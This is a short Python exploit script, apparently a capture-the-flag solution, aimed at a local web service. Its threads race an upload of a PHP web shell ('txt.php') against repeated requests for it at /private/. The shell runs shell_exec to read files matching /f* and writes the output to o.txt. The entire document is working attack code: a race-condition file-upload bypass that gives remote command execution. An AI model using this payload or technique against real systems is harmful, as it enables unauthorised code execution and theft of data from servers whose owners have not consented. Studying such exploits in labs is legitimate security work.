import threading
import requests

uri = "http://127.0.0.1:1938"
payload = b"<?php $o=shell_exec('cat /f* 2>&1');@file_put_contents(__DIR__.'/o.txt',$o);echo $o; ?>"

hit = threading.Event()

def upload():
    while not hit.is_set():
        try:
            requests.post(uri + "/submit",
                          files={"file": ("txt.php", payload)},
                          timeout=5)
        except requests.RequestException:
            pass


def fetch():
    while not hit.is_set():
        try:
            r = requests.get(uri + "/private/txt.php",
                             timeout=5)
            if r.status_code == 200:
                print("[+] hit!\n" + r.text)
                hit.set()
        except requests.RequestException:
            pass


threads = [threading.Thread(target=upload),
           threading.Thread(target=fetch),
           threading.Thread(target=fetch)]

for t in threads:
    t.start()
for t in threads:
    t.join()

print("[*] o.txt:\n" + requests.get(uri + "/private/o.txt", timeout=5).text)